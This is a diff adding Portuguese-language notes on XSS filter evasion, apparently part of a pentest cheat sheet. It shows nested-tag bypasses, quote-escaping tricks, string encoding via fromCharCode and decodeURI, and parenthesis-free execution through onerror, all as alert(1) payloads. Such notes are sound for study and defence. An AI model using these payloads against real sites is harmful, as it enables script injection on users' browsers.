@@ -214,3 +214,88 @@ Estrutura do data:
 
 # Bypassing Sanitization
 
+## Removing HTML Tags
+
+Frequentemente os mecanismos de segurança acabam sanitizando potenciais vetores de ataque XSS. O mais comum é o HTML encode que troca alguns caracteres como: < (&lt;) e > (&gt;). Em algumas situações o filtro vai remover a palavra chave como a tag \<script>
+
+Uma má configuração comum é remover somente o primeiro encontro da expressão, isso permite, por exemplo, realizar o bypass da seguinte maneira:
+
+```HTML
+<script>alert(1)</script>   // Block
+
+<scr<script>ipt>alert(1)</script>
+```
+
+Alguns filtros realizam buscas recursivas, porém, normalmente eles são configurados para verificar uma palavra recursivamente e quando a verificação acaba ele vai para a próxima palavra, ao final ele não volta a verificar uma palavra que já passou.
+
+Isso permite que o bypass seja realizado da seguinte forma:
+
+```HTML
+<script>alert(1)</script>   // Block
+
+<scr<iframe>ipt>alert(1)</script>
+```
+
+Dependendo do vetor de ataque, também é possível usar algumas técnicas vistas anteriormente
+## Escaping Quotes
+
+Normalmente quando conseguimos injetar um código JavaScript ele está dentro de aspas, e quando tentamos colocar alguma aspas para terminar a string ela é escapada com o \
+
+Imaginamos o seguinte cenário:
+
+```HTML
+<script>
+	var key = 'randomkey';
+</script>
+```
+
+Nosso payload é injetado no lugar de "randomkey". Podemos tentar realizar o bypass enviando também uma \\. Exemplo:
+
+```JavaScript
+randomkey' alert(1); //   <= Payload enviado
+randomkey\' alert(1); //  <= Resultado (Caractere escapado, não executando o alert)
+
+randomkey\' alert(1); //   <= Payload enviado
+randomkey\\' alert(1); //  <= Resultado (Só o \ foi escapado, permitindo finalizar a string)
+```
+
+Um método útil é o String.fromCharCode() que permite gerar strings a partir de uma sequência de valores unicode
+
+```JavaScript
+String.fromCharCode(120,115,9416) 
+// 120 = U+0078 = Letra x
+// 115 = U+0073 = Letra S
+// 120 = U+24C8 = Letra S
+
+// Outras formas
+/Minha string/.source
+43804..toString(36)  // Base36
+```
+
+Também pode ser usado o método unescape para escapar uma string gerada com o .source, exemplo:
+
+```Javascript
+unescape(/%78%u0073%73/.source)
+```
+
+Adicionalmente a esse método existe o decodeURI e o decodeURIComponent. Nesse caso os componentes precisam estar com o formato URL encode
+
+```Javascript
+decodeURI(/alert(%22xss%22)/.source)
+decodeURIComponent(/alert(%22xss%22)/.source)
+```
+
+Todos esses métodos retornam uma string, então é necessário usar um sink para executar o código, como por exemplo, o eval
+## Escaping Parentheses
+
+Uma forma de executar o código sem usar parenteses:
+
+```HTML
+<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
+						  onerror=alert;throw 1;  // Versão simples
+
+<img src=x onerror="window.onerror=eval;throw'\u003d&#x0061;&#x006C;ert&#x0028;1&#41;'"> // Encoded
+```
+
+# Bypassing Browser Filters
+
